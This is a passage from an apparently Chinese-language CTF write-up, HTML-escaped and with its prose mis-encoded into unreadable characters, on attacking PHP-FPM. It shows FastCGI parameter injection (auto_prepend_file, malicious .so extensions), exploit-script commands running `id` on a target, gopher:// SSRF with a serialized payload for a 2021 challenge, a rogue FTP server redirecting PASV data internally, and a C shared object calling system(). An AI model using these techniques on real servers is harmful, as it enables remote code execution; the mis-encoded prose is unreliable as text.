&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­&lt;code>SCRIPT_FILENAME&lt;/code>å°±æ˜¯php-fpmä¼šåŽ»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œç”±äºŽ5.3.9ç‰ˆæœ¬å¼•å…¥äº†&lt;code>security.limit_extensions&lt;/code>çš„é€‰é¡¹ï¼Œé»˜è®¤å¯¹åŽç¼€åé™åˆ¶åœ¨äº†phpå®¶æ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ‰¾åˆ°å·²å­˜åœ¨phpæ–‡ä»¶ï¼ˆå®‰è£…æ—¶é™„å¸¦çš„phpæ–‡ä»¶ å¯ä»¥é€šè¿‡&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>æ¥æœç´¢ä¸€ä¸‹é»˜è®¤çŽ¯å¢ƒ æ¯”å¦‚/usr/local/lib/php/PEAR.phpï¼‰ï¼Œå‘å…¶ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼›è€Œfpmæ”¯æŒé€šè¿‡è®¾ç½®&lt;code>FASTCGI_PARAMS&lt;/code>æ¥åŠ¨æ€ä¿®æ”¹phpçš„è®¾ç½®ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸¤é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
&lt;/code>&lt;/pre>&lt;p>æ¥åšåˆ°æ‰§è¡ŒæŸphpæ–‡ä»¶æ—¶è‡ªåŠ¨åŒ…å«POSTå†…å®¹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆdisable_functionåœ¨phpåŠ è½½æ—¶å°±ç¡®å®šå¥½äº†ï¼Œæ— æ³•é‡å†™ï¼‰&lt;/p>
&lt;h2 id="æ”»å‡»æ€è·¯ä¾‹é¢˜">æ”»å‡»æ€è·¯&amp;amp;&amp;amp;ä¾‹é¢˜&lt;/h2>
&lt;p>ä¼ªé€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸é€šä¿¡çš„FastCGIå®¢æˆ·ç«¯ï¼Œå°†ä¼ è¾“çš„å†…å®¹ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadï¼Œå†å‘å‡ºåŽ»&lt;/p>
&lt;h3 id="è¿œç¨‹æ”»å‡»php-fpm">è¿œç¨‹æ”»å‡»php-fpm&lt;/h3>
&lt;p>è¿™é‡Œæ˜¯&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">pç‰›çš„è„šæœ¬&lt;/a>ï¼Œå…¼å®¹py2&amp;amp;3ï¼Œé»˜è®¤-p 9000ï¼Œ-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬éœ€è¦æ”¹åŠ¨çš„åªæœ‰paramséƒ¨åˆ†çš„&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>æˆåŠŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æžœåªæ˜¯åŠ è½½æ¶æ„.soè€Œä¸æ‰§è¡Œä»£ç ï¼Œåˆ™å¹¶ä¸éœ€è¦æœ‰å·²å­˜åœ¨phpæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç”¨&lt;code>_&lt;/code>å ä½å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrfæ”»å‡»æœ¬åœ°php-fpm">SSRFæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;p>åˆ©ç”¨&lt;code>gopher://&lt;/code>åè®®å¯ä»¥ç›´æŽ¥ä¼ è¾“TCPåè®®æµï¼Œæˆ‘ä»¬æž„é€ å¥½payloadä¹‹åŽå°±å¯ä»¥ä¼ å…¥è¿›è¡Œssrfæ”»å‡»äº†&lt;/p>
&lt;p>æž„é€ payloadä¾æ—§ä½¿ç”¨pç‰›çš„è„šæœ¬ï¼Œä¸è¿‡åšä¸€ç‚¹å¾®å°çš„æ”¹åŠ¨ï¼›è¿™éƒ¨åˆ†å¯ä»¥å‚è§åŽé¢ç»“åˆftpæ”»å‡»fpmçš„å†…å®¹ï¼Œæ€»ä¹‹å°±ç…§è¿™å‡ æ­¥èµ°&lt;/p>
&lt;ul>
&lt;li>pç‰›è„šæœ¬ç”Ÿæˆurlencodeä¹‹åŽçš„tcpæ•°æ®æµ&lt;/li>
&lt;li>åŠ gopher://127.0.0.1:9000å‰ç¼€&lt;/li>
&lt;li>æ¢­ï¼?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="å¼ºç½‘é’å°‘-2021ssrf">[å¼ºç½‘é’å°‘ 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pç‰›è„šæœ¬ç”Ÿæˆpayloadï¼Œç›´æŽ¥ssrfä¼ªåè®®å¥½åƒä¹Ÿè¡Œï¼Ÿæ²¡çŽ¯å¢ƒï¼Œäº‘ä¸€ä¸‹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†åºåˆ—åŒ–ä¹‹åŽçš„ç»“æžœä¼ å…¥crawldata&lt;/p>
&lt;h3 id="ç»“åˆftppasv-modeæ”»å‡»æœ¬åœ°php-fpm">ç»“åˆftp&amp;amp;PASV modeæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;h4 id="ftpä½¿ç”¨pasvæ¨¡å¼è½¬å‘ftp-data">ftpä½¿ç”¨PASVæ¨¡å¼è½¬å‘ftp-data&lt;/h4>
&lt;p>å…ˆç®€å•æµ‹è¯•ftpè¿žæŽ¥è¿›è¡ŒæŠ“åŒ…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>å…¶ä¸­çš„&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>çš„æ‹¬å·å†…çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä¼ è¾“çš„FTP-DATAæ‰“å‘çš„ä½ç½®ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯ipï¼Œç«¯å£æ˜¯230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–‡ä»¶å†…å®¹æ˜¯150okä¹‹åŽæ‰è¢«ä¼ å‡ºåŽ»çš„ï¼Œè€Œä¸”ä¼šè¢«æ”¾åœ¨FTP-DATAä¸­è¢«ä¸Šä¼ å’Œä¸‹è½½&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³passive åˆ‡æ¢è¢«åŠ¨æ¨¡å¼ï¼‰æ—¶è¿”å›ž&lt;code>(127,0,0,1,0,12345)&lt;/code>æ¥è®©FTP-DATAæ‰“å‘å†…ç½‘12345ç«¯å£ï¼›è¿™æ˜¯ä¸€ä¸ªæ¶æ„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å¦ä¸€å°192.168.187.3ä¸Šè®¿é—®è¿™ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœŸé—´ä¼ è¾“çš„æ–‡ä»¶å°±ä¼šè¢«è½¬å‘åˆ°192.168.187.3è‡ªå·±çš„12345ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="phpåŠ è½½æ¶æ„soæ–‡ä»¶">phpåŠ è½½æ¶æ„.soæ–‡ä»¶&lt;/h4>
&lt;p>ä¿®æ”¹php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cæºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘ä¸º.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡Œphpå³è§¦å‘æ¶æ„.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftp">ä»¤phpä½¿ç”¨ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftpè¯» æ³¨æ„åŽé¢çš„è·¯å¾„éƒ½éœ€è¦ç»å¯¹è·¯å¾„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
